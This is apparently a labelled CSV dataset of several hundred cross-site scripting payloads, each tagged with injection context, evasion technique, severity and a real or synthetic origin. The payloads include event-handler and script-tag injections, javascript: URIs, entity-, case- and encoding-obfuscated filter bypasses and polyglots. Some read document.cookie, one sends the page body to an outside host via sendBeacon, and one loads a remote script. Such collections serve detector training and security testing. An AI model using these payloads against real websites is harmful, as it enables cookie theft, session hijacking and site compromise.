payload,context,technique,severity,length,source
<scr\uffffipt>alert(0)</script>,generic,unicode_escape,medium,31,real
%22 onmouseenter=console.log(document.domain) %22,attribute_escape,synthetic,medium,49,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style=""position:absolute;"" onanimationcancel=""print()""></ins>",event_handler,none,low,175,real
</script><script>alert('You got AnonKryptiQuzed')</script>,script_injection,none,medium,58,real
"document.write(""<img src=x onerror=prompt(String.fromCharCode(88,83,83))>"")",dom_sink,synthetic,medium,75,synthetic
"""javascript:confirm(0);"",",js_uri,none,medium,25,real
<style onpointerdown=alert(1) style=display:block>AnonKryptiQuz</style>,event_handler,none,medium,71,real
%22 onload=confirm(1) %22,attribute_escape,synthetic,medium,25,synthetic
"""><svg onclick=prompt(location.hash)>",tag_injection,synthetic,medium,37,synthetic
""" oNmoUseOveR=aLerT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,medium,52,synthetic
<ol onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</ol>,event_handler,none,medium,70,real
<script>//confirm(%27XSS%27)</script>,script_injection,synthetic,medium,37,synthetic
"<noscript onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",event_handler,none,medium,75,real
"<style>:target {color:red;}</style><iframe id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></iframe>",event_handler,none,medium,116,real
<isindex id=x tabindex=1 onfocus=alert(1)></isindex>,event_handler,none,medium,52,real
"<area id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></area>",event_handler,none,medium,84,real
"<svg onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,82,real
"<strike draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</strike>",event_handler,none,medium,70,real
<script>Object.prototype.documentMode = 9</script>,script_injection,script_tag,high,50,real
"<input ondblclick=""alert(1)"">AnonKryptiQuz</input>",event_handler,none,medium,50,real
' onmouseover=prompt(document.cookie) ',attribute_escape,synthetic,medium,39,synthetic
<svg onb&#101;gin=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,53,synthetic
"<div draggable=""true"" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable style=display:block>drop here</strike>",event_handler,none,medium,133,real
%22 onclick=alert(document.cookie) %22,attribute_escape,synthetic,medium,38,synthetic
<svg onclick=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,56,synthetic
"<style>@keyframes slidein {}</style><footer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></footer>",event_handler,none,medium,166,real
"<cite draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,86,real
<nextid onpointerenter=alert(1) style=display:block>AnonKryptiQuz</nextid>,event_handler,none,medium,74,real
<svG oNmoUseOveR=cOnsOle.loG(1)>,tag_injection,synthetic,medium,32,synthetic
"<button draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</button>",event_handler,none,medium,90,real
"<figcaption onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</figcaption>",event_handler,none,medium,73,real
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationstart=""alert(1)""></noframes>",event_handler,none,medium,103,real
<multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>,event_handler,none,medium,70,real
"""><script+src=""https://count.tbcdn.cn//counter3?callback=alert(1337)""></script>",script_injection,none,medium,79,real
"<body ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</body>",event_handler,none,medium,89,real
<b onpointerout=alert(1) style=display:block>AnonKryptiQuz</b>,event_handler,none,medium,62,real
"""><script>alert(1)</script>",script_injection,none,medium,27,real
"<select ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</select>",event_handler,none,medium,93,real
"<image onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</image>",event_handler,none,medium,68,real
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",event_handler,none,medium,87,real
"<img \x00src=x onerror=""alert(1)"">",event_handler,none,medium,34,real
'><script>alert(1)</script>,script_injection,none,medium,27,real
"<menu onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",event_handler,none,medium,70,real
"""><svg onerror=confirm(1)>",tag_injection,synthetic,medium,26,synthetic
"<fieldset draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",event_handler,none,medium,94,real
"<input draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</input>",event_handler,none,medium,68,real
<form><input formaction=javascript:alert(1) type=image value=click>,js_uri,none,medium,67,real
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationstart=""alert(1)""></u>",event_handler,none,medium,89,real
<li onpointerover=alert(1) style=display:block>AnonKryptiQuz</li>,event_handler,none,medium,65,real
">'""><img src=x onerror=script(2);>",event_handler,none,low,34,real
"<option onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</option>",event_handler,none,medium,85,real
"<svg></p><style><g title=""</style><img src onerror=alert(document.domain)>"">",event_handler,none,medium,76,real
"<img2 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></img2>",event_handler,none,medium,84,real
"<style>:target {color: red;}</style><q id=x style=""transition:color 10s"" ontransitioncancel=print()></q>",event_handler,none,low,104,real
"<rtc id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></rtc>",event_handler,none,medium,82,real
"<label onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</label>",event_handler,none,medium,86,real
<input3 contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,60,real
#{{_s.constructor('alert(1)')()}},template_injection,none,medium,33,real
"<img onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</img>",event_handler,none,medium,59,real
"<area onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</area>",event_handler,none,medium,69,real
' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,69,synthetic
"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationend=""alert(1)""></object>",event_handler,none,medium,97,real
"<iframe oncontextmenu=""alert(1)"">AnonKryptiQuz</iframe>",event_handler,none,medium,55,real
<imG oNloAd=AleRt(1)>,tag_injection,synthetic,medium,21,synthetic
"<style>:target {color: red;}</style><dialog id=x style=""transition:color 10s"" ontransitioncancel=print()></dialog>",event_handler,none,low,114,real
&#x000003c;,generic,html_entity,low,11,real
<textarea onselect=alert(1) autofocus>AnonKryptiQuz</textarea>,event_handler,none,medium,62,real
"document.write(""%3Cimg src=x onerror=console.log(document.domain)%3E"")",dom_sink,synthetic,medium,70,synthetic
<header id=x tabindex=1 onfocusin=alert(1)></header>,event_handler,none,medium,52,real
&#x3c;img&#x2f;src&#x2f;onerror=alert('kalendra')&#x3e;,event_handler,html_entity,medium,55,real
<svg ontoggle=alert(document.domain)>,tag_injection,synthetic,medium,37,synthetic
"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>",event_handler,none,medium,103,real
"<span onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</span>",event_handler,none,medium,67,real
""" onclick=\u0061lert(document.cookie) """,attribute_escape,synthetic,medium,39,synthetic
"<IMG SRC=""javascript:alert(4392)""",js_uri,case_variation,medium,33,real
<script onpointermove=alert(1) style=display:block>AnonKryptiQuz</script>,script_injection,none,medium,73,real
"<del draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</del>",event_handler,none,medium,64,real
<IMG SRC=JaVaScRiPt:alert(9924)>,js_uri,case_variation,medium,32,real
"'alert(1)'.replace(/.+/,eval)",generic,none,medium,29,real
"<tbody onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</tbody>",event_handler,none,medium,85,real
"""><svg onmous&#101;&#101;nt&#101;r=confirm('XSS')>",tag_injection,synthetic,medium,50,synthetic
"""><svg onload=\u0061lert(1)>",tag_injection,synthetic,medium,28,synthetic
%22 onload=prompt(document.domain) %22,attribute_escape,synthetic,medium,38,synthetic
"<hgroup onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</hgroup>",event_handler,none,medium,74,real
"<plaintext oncontextmenu=""alert(1)"">AnonKryptiQuz</plaintext>",event_handler,none,medium,61,real
"<details onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</details>",event_handler,none,medium,70,real
"<img\x32src=x onerror=""javascript:alert(1)"">",event_handler,none,medium,44,real
"<picture onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",event_handler,none,medium,75,real
' onmouseenter=confirm(location.hash) ',attribute_escape,synthetic,medium,39,synthetic
"<style>:target {color:red;}</style><noembed id=x style=""transition:color 1s"" ontransitionstart=alert(1)></noembed>",event_handler,none,medium,114,real
"setTimeout(""console.log(String.fromCharCode(88,83,83))"",0)",dom_sink,synthetic,medium,58,synthetic
<script>//confirm(document.cookie)</script>,script_injection,synthetic,medium,43,synthetic
"<del onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</del>",event_handler,none,medium,79,real
<shadow onpointerup=alert(1) style=display:block>AnonKryptiQuz</shadow>,event_handler,none,medium,71,real
<legend id=x tabindex=1 onbeforeactivate=alert(1)></legend>,event_handler,none,medium,59,real
"<canvas draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</canvas>",event_handler,none,medium,70,real
"<datalist onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</datalist>",event_handler,none,medium,73,real
"<s draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</s>",event_handler,none,medium,79,real
<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>,event_handler,none,medium,78,real
"<article onclick=""alert(1)"" style=display:block>AnonKryptiQuz</article>",event_handler,none,medium,71,real
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
"<style>:target {transform: rotate(180deg);}</style><span id=x style=""transition:transform 2s"" ontransitionrun=print()></span>",event_handler,none,low,125,real
"""%3E%3Csvg onbegin=alert(1)%3E",tag_injection,synthetic,medium,30,synthetic
<svg onmouseover=alert(1)/>,tag_injection,synthetic,medium,27,synthetic
"<style>:target {transform: rotate(180deg);}</style><acronym id=x style=""transition:transform 2s"" ontransitionrun=print()></acronym>",event_handler,none,low,131,real
"&#101;v&#97;l(""&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink,synthetic,medium,71,synthetic
<script>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>,script_injection,obfuscation,high,106,real
<form onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</form><input value=clickme>,event_handler,none,medium,108,real
<button popovertarget=x>Click me</button><rp onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</rp>,event_handler,none,medium,100,real
<scRipT>cOnfIrm`loCatIon.haSh`</sCriPt>,script_injection,synthetic,medium,39,synthetic
<animatetransform onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</animatetransform><input value=clickme>,event_handler,none,medium,132,real
"<pre onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",event_handler,none,medium,65,real
"<svg onerror=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
"setTimeout(""console.log(document.cookie)"",0)",dom_sink,synthetic,medium,44,synthetic
<script>/*/\u0061lert(location.hash)</script>,script_injection,synthetic,medium,45,synthetic
""" oNfoCus=prOmpT(lOcaTioN.hAsh) aUtoFocUs=""",attribute_escape,synthetic,medium,43,synthetic
"<script>confirm(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,medium,55,synthetic
"<sup onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</sup>",event_handler,none,medium,67,real
<svg onclick=prompt('XSS')>,tag_injection,synthetic,medium,27,synthetic
<ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>,event_handler,none,medium,51,real
"<datalist onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></datalist>",event_handler,none,medium,289,real
"""><Svg onMouSeeNteR=pRomPt('XSS')>",tag_injection,synthetic,medium,34,synthetic
"<option onclick=""alert(1)"" style=display:block>AnonKryptiQuz</option>",event_handler,none,medium,69,real
"""><svg onmous&#101;ov&#101;r=confirm(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,64,synthetic
<summary onpointerdown=alert(1) style=display:block>AnonKryptiQuz</summary>,event_handler,none,medium,75,real
javascript:void(console.log(1)),js_uri,synthetic,medium,31,synthetic
""" oNfoCus=alErt(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,34,synthetic
"<summary onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",event_handler,none,medium,75,real
"<script onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></script>",script_injection,none,medium,285,real
""" on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,58,synthetic
"<hgroup onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</hgroup>",event_handler,none,medium,73,real
"<multicol oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,102,real
"<form oncut=""alert(1)"" contenteditable>AnonKryptiQuz</form>",event_handler,none,medium,59,real
"<shadow onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",event_handler,none,medium,65,real
' ontoggl&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,57,synthetic
""" oNclIck=coNsoLe.Log(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,40,synthetic
+ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-,generic,none,medium,57,real
"<blink onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",event_handler,none,medium,71,real
<style onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,67,real
"<style onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</style>",event_handler,none,medium,63,real
"<svg x=""200"">",tag_injection,none,low,13,real
"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">XSS</a>",attribute_escape,encoding,medium,57,real
<ol id=x tabindex=1 onactivate=alert(1)></ol>,event_handler,none,medium,45,real
"""><svg onmouseover=prompt(1)>",tag_injection,synthetic,medium,29,synthetic
"Enter_Mouse_Pointer_Here_to_get_AnonKryptiQuz<P/onpointerenter=""alert(1)"">",event_handler,case_variation,medium,74,real
%3Csvg onfocus=confirm(document.domain)%3E,tag_injection,synthetic,medium,42,synthetic
"<area ondblclick=""alert(1)"">AnonKryptiQuz</area>",event_handler,none,medium,48,real
<set onpointerout=alert(1) style=display:block>AnonKryptiQuz</set>,event_handler,none,medium,66,real
"<output onmouseover=""alert(1)"">AnonKryptiQuz</output>",event_handler,none,medium,53,real
"<style>:target {transform: rotate(180deg);}</style><mark id=x style=""transition:transform 2s"" ontransitionrun=print()></mark>",event_handler,none,low,125,real
"<style>@keyframes x{}</style><input4 style=""animation-name:x"" onanimationstart=""alert(1)""></input4>",event_handler,none,medium,99,real
"<ul oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",event_handler,none,medium,67,real
<slot onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</slot><input value=clickme>,event_handler,none,medium,99,real
""" onclick=alert('XSS') """,attribute_escape,synthetic,medium,24,synthetic
javascript:prompt(/AnonKryptiQuz/.source);var x = prompt;x(0);x(/AnonKryptiQuz/.source);x,js_uri,none,medium,89,real
<content onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,69,real
"<IMG SRC=x onbeforeunload=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,65,real
"""><svg onmouseenter=alert(1)>",tag_injection,synthetic,medium,29,synthetic
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",script_injection,case_variation,medium,38,real
"<sup ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</sup>",event_handler,none,medium,87,real
<svg onerror=confirm(%27XSS%27)>,tag_injection,synthetic,medium,32,synthetic
""" onfocus=alert(document.domain) ""> <""",event_handler,none,medium,38,real
<body oninput=javascript:alert(1)><input autofocus>,event_handler,none,medium,51,real
%22><svg ontoggle=prompt(1)>,tag_injection,synthetic,medium,28,synthetic
' onmouseenter=alert(location.hash) ',attribute_escape,synthetic,medium,37,synthetic
%27 onmouseover=console.log(document.domain) %27,attribute_escape,synthetic,medium,48,synthetic
' onfocus=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,52,synthetic
"<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",event_handler,none,low,99,real
<script>prompt('XSS')</script>,script_injection,synthetic,medium,30,synthetic
"""><Svg onMouSeoVer=coNsoLe.Log(1)>",tag_injection,synthetic,medium,34,synthetic
""" on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,60,synthetic
"<dl onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",event_handler,none,medium,60,real
"<INPUT TYPE=""BUTTON"" action=""alert('XSS')""/>",attribute_escape,case_variation,medium,44,real
"<div draggable=""true"" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable style=display:block>drop here</sub>",event_handler,none,medium,127,real
<img src @error=this.alert(1)>,tag_injection,none,medium,30,real
"<abbr onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",event_handler,none,medium,69,real
"<small oncut=""alert(1)"" contenteditable>AnonKryptiQuz</small>",event_handler,none,medium,61,real
<button popovertarget=x>Click me</button><input ontoggle=alert(1) popover id=x>AnonKryptiQuz</input>,event_handler,none,medium,100,real
"<style>:target {color:red;}</style><audio2 id=x style=""transition:color 1s"" ontransitionstart=alert(1)></audio2>",event_handler,none,medium,112,real
' onfocus=alert('XSS') ',attribute_escape,synthetic,medium,24,synthetic
"<datalist onmouseleave=""alert(1)"">AnonKryptiQuz</datalist>",event_handler,none,medium,58,real
"<dd onclick=""alert(1)"">AnonKryptiQuz</dd>",event_handler,none,medium,41,real
"d=""alert('AnonKryptiQuz');\"")"";",generic,none,medium,31,real
""" onmous&#101;&#101;nt&#101;r=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,62,synthetic
<input type=image onloadstart=alert(1) src=validimage.png>,event_handler,none,medium,58,real
%22><svg ontoggle=alert(%27XSS%27)>,tag_injection,synthetic,medium,35,synthetic
<noframes onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
"<tr onmouseout=""alert(1)"">AnonKryptiQuz</tr>",event_handler,none,medium,44,real
<video contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,59,real
<hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>,event_handler,none,medium,62,real
"<! foo=""><script>javascript:alert(4032)</script>"">",script_injection,none,medium,50,real
"<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,91,synthetic
"<applet onmousedown=""alert(1)"">AnonKryptiQuz</applet>",event_handler,none,medium,53,real
<ıframe id=x onload=>,event_handler,none,low,21,real
<img src=x onerror=URL='javascript:confirm(1)'>,event_handler,none,medium,47,real
' onlo&#97;d=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,57,synthetic
"""></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=""0%EF%BB%BF",script_injection,url_encoding,medium,98,real
"<style>@keyframes slidein {}</style><sub style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></sub>",event_handler,none,medium,166,real
"<time onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</time>",event_handler,none,medium,67,real
<menuitem contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,62,real
<dfn onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
<button popovertarget=x>Click me</button><element onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</element>,event_handler,none,medium,110,real
""" onmous&#101;ov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,82,synthetic
<source onpointerdown=alert(1) style=display:block>AnonKryptiQuz</source>,event_handler,none,medium,73,real
<b onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</b><input value=clickme>,event_handler,none,medium,102,real
"<style>@keyframes x{}</style><animatetransform style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></animatetransform>",event_handler,none,medium,125,real
%3Cimg%20src%3Dx%20onerror%3D%60alert%28%2FAnonKryptiQuz%2F%29%60%3E,generic,url_encoding,low,68,real
"jaVasCript:/*`/*\`/*'/*\""//""/**/(onload=alert())//<svg/onload=alert()><frame/onload=alert()></select></noscript></noembed></template></stYle/</titLe/</teXtarEa/</script/--><sVg/oNloAd= alert()//>",event_handler,comment_injection,medium,195,real
<button popovertarget=x>Click me</button><em onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</em>,event_handler,none,medium,100,real
"<command oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</command>",event_handler,none,medium,66,real
%3Csvg onerror=prompt(location.hash)/%3E,tag_injection,synthetic,medium,40,synthetic
<iframe onpointerdown=alert(1) style=display:block>AnonKryptiQuz</iframe>,event_handler,none,medium,73,real
<ins onpointerenter=alert(1) style=display:block>AnonKryptiQuz</ins>,event_handler,none,medium,68,real
<button popovertarget=x>Click me</button><slot onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</slot>,event_handler,none,medium,104,real
<svg ontoggle=console.log(%27XSS%27)>,tag_injection,synthetic,medium,37,synthetic
<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>,event_handler,none,medium,76,real
"eval(""prompt('XSS')"")",dom_sink,synthetic,medium,21,synthetic
"<rt onclick=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,61,real
<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>,event_handler,none,medium,69,real
<image onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</image><input value=clickme>,event_handler,none,medium,110,real
' onmous&#101;ov&#101;r=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape,synthetic,medium,60,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style=""position:absolute;"" onanimationcancel=""print()""></strong>",event_handler,none,low,181,real
<svg onclick=alert(document.cookie)>,tag_injection,synthetic,medium,36,synthetic
<slot onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</slot><input value=clickme>,event_handler,none,medium,108,real
""" oNerRor=prOmpT(lOcaTioN.hAsh) """,attribute_escape,synthetic,medium,33,synthetic
"<figure onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",event_handler,none,medium,73,real
"<link onclick=""alert(1)"" style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,65,real
<mark onpointerover=alert(1) style=display:block>AnonKryptiQuz</mark>,event_handler,none,medium,69,real
<a id=x tabindex=1 onactivate=alert(1)></a>,event_handler,none,medium,43,real
"<a title=""&{alert(1)}"">XSS</a>",generic,tag_injection,medium,30,real
%3Cscript%3E/*/prompt(document.domain)%3C/script%3E,script_injection,synthetic,medium,51,synthetic
"<li onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</li>",event_handler,none,medium,65,real
"<frameset onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",event_handler,none,medium,77,real
"<animatetransform onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",event_handler,none,medium,93,real
"?getURLValue=javascript:alert(1)"",",js_uri,none,medium,34,real
JavAscRipT:cOnfIrm(loCatIon.haSh),js_uri,synthetic,medium,33,synthetic
' onmouseenter=console.log('XSS') ',attribute_escape,synthetic,medium,35,synthetic
<img onload=\u0061lert(1)/>,tag_injection,synthetic,medium,27,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""print()""></hr>",event_handler,none,low,173,real
<svG oNfoCus=prOmpT(dOcuMenT.cOokIe)/>,tag_injection,synthetic,medium,38,synthetic
""" ontoggle=confirm(document.domain) """,attribute_escape,synthetic,medium,37,synthetic
<input4 onpointerup=alert(1) style=display:block>AnonKryptiQuz</input4>,event_handler,none,medium,71,real
"<article draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</article>",event_handler,none,medium,70,real
<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>,event_handler,none,medium,54,real
"<input type=""text"" value=""jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e""></input>",event_handler,comment_injection|url_encoding,medium,180,real
"<image draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</image>",event_handler,none,medium,68,real
<svg onlo&#97;d=&#97;l&#101;rt(1)>,tag_injection,synthetic,medium,34,synthetic
"<textarea oncontextmenu=""alert(1)"">AnonKryptiQuz</textarea>",event_handler,none,medium,59,real
"<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">",tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,47,real
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>",event_handler,none,medium,97,real
"<marquee onclick=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",event_handler,none,medium,71,real
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,script_injection,none,high,67,real
"<body draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</body>",event_handler,none,medium,66,real
%22><svg onmouseenter=console.log(%27XSS%27)>,tag_injection,synthetic,medium,45,synthetic
"<style>:target {color: red;}</style><center id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></center>",event_handler,none,medium,115,real
<svG oNmoUseOveR=cOnfIrm('XSS')/>,tag_injection,synthetic,medium,33,synthetic
<center id=x tabindex=1 onfocusin=alert(1)></center>,event_handler,none,medium,52,real
"<nextid onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",event_handler,none,medium,73,real
<bdo onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</bdo><input value=clickme>,event_handler,none,medium,97,real
eval(%22console.log(document.cookie)%22),dom_sink,synthetic,medium,40,synthetic
"<blink onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</blink>",event_handler,none,medium,69,real
